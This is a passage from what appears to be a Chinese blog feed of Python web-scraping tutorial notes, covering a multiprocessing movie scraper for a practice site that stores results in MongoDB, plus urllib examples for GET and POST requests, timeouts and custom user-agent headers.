href="https://www.cnblogs.com/lone5wolf/p/10855985.html">CentOS7下安装配置Mongodb3.6 - #独狼 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/zhao_5352269/article/details/82151173">Cenos7 yum安装mongodb以及各种错误的解决办法-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/449833439">Linux Centos 7安装MongoDB（简单！详细！） - 知乎 (zhihu.com)</a></p><p><img src="/img/image-20230930201309769.png" alt="image-20230930201309769"></p><p>下载mongodb compass（gui工具）  Documents显示有问题（版本原因）</p><p><a href="https://www.mongodb.com/try/download/compass">MongoDB Compass Download (GUI) | MongoDB</a></p><h4 id="存入mongodb"><a href="#存入mongodb" class="headerlink" title="存入mongodb"></a>存入mongodb</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建mongodb客户端</span><br>mongo_client = pymongo.MongoClient(<span class="hljs-string">&quot;mongodb://10.210.100.131:27017/&quot;</span>)<br><span class="hljs-comment">#创建数据库</span><br>db = mongo_client[<span class="hljs-string">&#x27;r1_movies&#x27;</span>]<br>collection = db[<span class="hljs-string">&#x27;movies&#x27;</span>]<br><br><span class="hljs-comment">#保存数据到mongodb 使用时调用此函数即可</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_data</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment">#插入数据</span><br>    collection.insert_one(data)<br>    logging.info(<span class="hljs-string">&quot;数据保存到mongodb成功！！！&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/img/image-20230930201234040.png" alt="image-20230930201234040" style="zoom:67%;" /><p><img src="/img/image-20230930201813980.png" alt="image-20230930201813980"></p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> multiprocessing<br><br><span class="hljs-comment">#创建mongodb客户端</span><br>mongo_client = pymongo.MongoClient(<span class="hljs-string">&quot;mongodb://10.210.100.131:27017/&quot;</span>)<br><span class="hljs-comment">#创建数据库</span><br>db = mongo_client[<span class="hljs-string">&#x27;r1_movies&#x27;</span>]<br>collection = db[<span class="hljs-string">&#x27;movies&#x27;</span>]<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一列表页面的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出列表页所有电影的详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_detail</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> parse_detail(scrape_page(url))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则表达式将详情页相应的内容匹配下来</span><br>    <span class="hljs-comment">#图片url 正则</span><br>    img_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;</span>,re.S)<br>    img_url = re.search(img_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(img_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#img_url[0]</span><br><br>    <span class="hljs-comment">#类别 正则</span><br>    <span class="hljs-comment">#注意这里要加上re.S  .任意匹配  包括换行符</span><br>    <span class="hljs-comment">#因为.是匹配除了换行符之外的任意字符</span><br>    categories_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;</span>,re.S)<br>    categories = re.findall(categories_pattern,html) <span class="hljs-keyword">if</span> re.findall(categories_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">#上映时间 正则</span><br>    date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)\s?上映&#x27;</span>)<br>    date = re.search(date_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(date_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#date[0]</span><br><br>    <span class="hljs-comment">#评分 正则</span><br>    score_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    score = re.search(score_pattern,html).group(<span class="hljs-number">1</span>).split() <span class="hljs-keyword">if</span> re.search(score_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#score[0]  返回的列表</span><br><br>    <span class="hljs-comment">#剧情简介 正则</span><br>    drama_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    drama = re.search(drama_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(drama_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#drama[0]</span><br><br>    <span class="hljs-comment">#名称 正则</span><br>    name_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;</span>,re.S)<br>    name = re.search(name_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(name_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-comment">#name</span><br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-comment"># &#x27;image&#x27;:img_url[0],</span><br>        <span class="hljs-comment"># &#x27;categories&#x27;:categories,</span><br>        <span class="hljs-comment"># &#x27;date&#x27;:date[0],</span><br>        <span class="hljs-comment"># &#x27;score&#x27;:score[0],</span><br>        <span class="hljs-comment"># &#x27;drama&#x27;:drama,</span><br>        <span class="hljs-comment"># &#x27;name&#x27;:name</span><br>        <span class="hljs-string">&#x27;image&#x27;</span>:img_url,<br>        <span class="hljs-string">&#x27;categories&#x27;</span>:categories,<br>        <span class="hljs-string">&#x27;date&#x27;</span>:date,<br>        <span class="hljs-string">&#x27;score&#x27;</span>:score[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;drama&#x27;</span>:drama,<br>        <span class="hljs-string">&#x27;name&#x27;</span>:name<br>    &#125;<br><br><span class="hljs-comment">#保存数据到mongodb</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_data</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment">#插入数据</span><br>    collection.insert_one(data)<br>    logging.info(<span class="hljs-string">&quot;数据保存到mongodb成功！！！&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-comment">#获取所有电影详情页的链接</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #抓取某个页面的内容 返回html源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #根据源码抓取该页面上跳转详情页的链接</span><br>    <span class="hljs-comment">#     details_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #print(list(details_urls))</span><br>    <span class="hljs-comment">#     logging.info(&quot;详情页面链接%s&quot;,list(details_urls))</span><br><br>    <span class="hljs-comment">#加入多线程后舍弃</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#     #获取到第一页的源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #获取第一页所有电影的详情页的url</span><br>    <span class="hljs-comment">#     detail_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #爬取每个详情页的信息</span><br>    <span class="hljs-comment">#     for detail_url in detail_urls:</span><br>    <span class="hljs-comment">#         data = scrape_detail(detail_url)</span><br>    <span class="hljs-comment">#         #logging.info(&quot;get detail data %s&quot; % data)</span><br>    <span class="hljs-comment">#         save_data(data=data)</span><br>    <span class="hljs-comment">#         logging.info(&quot;data save successfully!!!&quot;)</span><br><br>    <br>    <span class="hljs-comment">#详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#获取到第一页的源码</span><br>    index_html = scrape_index(page)<br>    <span class="hljs-comment">#获取第一页所有电影的详情页的url</span><br>    detail_urls = parse_index(index_html)<br>    <span class="hljs-comment">#爬取每个详情页的信息</span><br>    <span class="hljs-keyword">for</span> detail_url <span class="hljs-keyword">in</span> detail_urls:<br>        data = scrape_detail(detail_url)<br>        <span class="hljs-comment">#logging.info(&quot;get detail data %s&quot; % data)</span><br>        save_data(data=data)<br>        logging.info(<span class="hljs-string">&quot;data save successfully!!!&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_main</span>(<span class="hljs-params">page</span>):<br>    main(page)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#获取CPU核心数量</span><br>    num_process = multiprocessing.cpu_count()<br>    <span class="hljs-comment">#根据cpu核心数量创建线程池</span><br>    pool = multiprocessing.Pool(num_process)<br>    <span class="hljs-comment">#要爬取页面的数量</span><br>    page_to_scrape = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,TOTAL_PAGE+<span class="hljs-number">1</span>))<br>    <span class="hljs-comment">#使用进程池运行</span><br>    pool.<span class="hljs-built_in">map</span>(run_main,page_to_scrape)<br>    <span class="hljs-comment">#关闭进程池</span><br>    pool.close()<br>    <span class="hljs-comment">#main()</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230930204730425.png" alt="image-20230930204730425" style="zoom: 50%;" /><img src="/img/image-20230930204640239.png" alt="image-20230930204640239" style="zoom: 50%;" />]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫学习</title>
    <link href="/2023/10/07/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/10/07/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫学习"><a href="#爬虫学习" class="headerlink" title="爬虫学习"></a>爬虫学习</h1><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>python内置的http请求库</p><p>4大模块：</p><p>1.request模块：最基本的http请求模块</p><p>2.error模块：异常处理模块</p><p>3.parse模块：工具模块，提供url的处理方法</p><p>4.robotparser模块：识别robot.txt</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><h4 id="第一个爬虫"><a href="#第一个爬虫" class="headerlink" title="第一个爬虫"></a>第一个爬虫</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><br><span class="hljs-comment">#发送一个最基本的请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;http://www.baidu.com/&#x27;</span><br>    response = urllib.request.urlopen(url)<br>    <span class="hljs-comment">#print(response.code)</span><br>    data = response.read()<br>    <span class="hljs-comment">#将data获取到的东西转换为字符串</span><br>    str_data = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment">#print(str_data)</span><br>    <span class="hljs-comment">#将数据写入文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;baidu.html&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(str_data)<br><br>load_baidu_data()<br></code></pre></td></tr></table></figure><h4 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#发送get型请求  单个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span><br>    <span class="hljs-comment">#url+search</span><br>    name = <span class="hljs-string">&quot;卢本伟&quot;</span><br>    final_url = url+name<br>    <span class="hljs-comment">#网址里包含了中文 需要进行转码</span><br>    encode_url = urllib.parse.quote(final_url,safe=string.printable)<br>    <span class="hljs-built_in">print</span>(encode_url)<br><br>    response = urllib.request.urlopen(encode_url)<br>    <span class="hljs-built_in">print</span>(response.code)<br><br>load_baidu_data()<br><br><br><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#发送get型请求  多个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?&#x27;</span><br>    <span class="hljs-comment">#使用params字典</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;wd&quot;</span>:<span class="hljs-string">&quot;孙悟空&quot;</span>,<br>        <span class="hljs-string">&quot;pn&quot;</span>:<span class="hljs-string">&quot;80&quot;</span><br>    &#125;<br>    query_str = urllib.parse.urlencode(params)<br>    <span class="hljs-built_in">print</span>(query_str)<br>    final_url = url+query_str<br>    <span class="hljs-built_in">print</span>(final_url)<br><br>    response = urllib.request.urlopen(final_url)<br>    <span class="hljs-comment">#print(response.code)</span><br>    str_data = response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(str_data)  <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;baidu-wukong-pn80.html&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(str_data)<br>load_baidu_data()<br></code></pre></td></tr></table></figure><h4 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#定义url</span><br><span class="hljs-comment">#用于测试的网站：  http://httpbin.org/post</span><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><span class="hljs-comment">#创建要发送的数据表单</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;hello&#x27;</span>:<span class="hljs-string">&#x27;world&#x27;</span>,<br>    <span class="hljs-string">&#x27;handsome&#x27;</span>:<span class="hljs-string">&#x27;r1cky&#x27;</span><br>&#125;<br><span class="hljs-comment">#data要进行编码</span><br>data_encode = urllib.parse.urlencode(data).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment">#加上encode(&#x27;uft-8&#x27;)  str --&gt; bytes   转换成bytes传输</span><br><span class="hljs-comment">#加上decode(&quot;utf-8&quot;) bytes--&gt;str   转换成str传输</span><br><br><span class="hljs-comment">#发送post请求</span><br>response = urllib.request.urlopen(url=url,data=data_encode)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="超时控制：timeout"><a href="#超时控制：timeout" class="headerlink" title="超时控制：timeout"></a>超时控制：timeout</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#超过0.1秒没有响应就报错</span><br>response = urllib.request.urlopen(url=url,data=data_encode,timeout=<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment">#异常处理：</span><br><span class="hljs-keyword">try</span>:<br>    response = urllib.request.urlopen(url=url,data=data_encode,timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;连接超时&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="自定义user-agent"><a href="#自定义user-agent" class="headerlink" title="自定义user-agent"></a>自定义user-agent</h4><p><strong>爬虫的核心就是模拟用户</strong>！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#定义url</span><br><span class="hljs-comment">#用于测试的网站：  http://httpbin.org/post</span><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><br><span class="hljs-comment">#自定义request  添加user-agent</span><br>header = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;hello&quot;</span>:<span class="hljs-string">&quot;world&quot;</span><br>&#125;<br><br>req = urllib.request.Request(url=url,headers=header,method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>response = urllib.request.urlopen(req)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h4 id="随机UA头小项目"><a href="#随机UA头小项目" class="headerlink" title="随机UA头小项目"></a>随机UA头小项目</h4><p>每次请求，都切换不同的user-agent</p><p>UA头数据网站：<a href="http://useragent.kuzhazha.com/">UserAgent大全_常用的UserAgent库下载_UserAgent在线工具_流行的UserAgent手机库UA_UA标识网 (kuzhazha.com)</a></p><p>思路：</p><p>1.定义多个ua头 列表</p><p>2.每次请求时切换ua头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user_agent</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br>    <span class="hljs-comment">#定义多个user-agent</span><br>    user_agent_list = [<br>        <span 